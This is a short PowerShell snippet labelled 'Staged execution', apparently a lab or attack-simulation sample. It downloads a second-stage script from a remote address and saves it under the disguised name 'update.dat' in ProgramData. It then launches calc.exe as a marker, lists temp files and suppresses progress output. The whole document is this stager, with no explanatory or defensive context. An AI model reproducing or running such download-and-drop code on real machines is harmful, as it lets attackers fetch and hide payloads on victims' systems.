
<# Staged execution #> $TransferUrl = 'https://192.0.2.109/stage1.ps1'; $DropPath = 'C:\ProgramData\update.dat'; $StageTimeout = 68; Invoke-WebRequest -Uri $TransferUrl -OutFile $DropPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; $ProgressPreference = "SilentlyContinue"
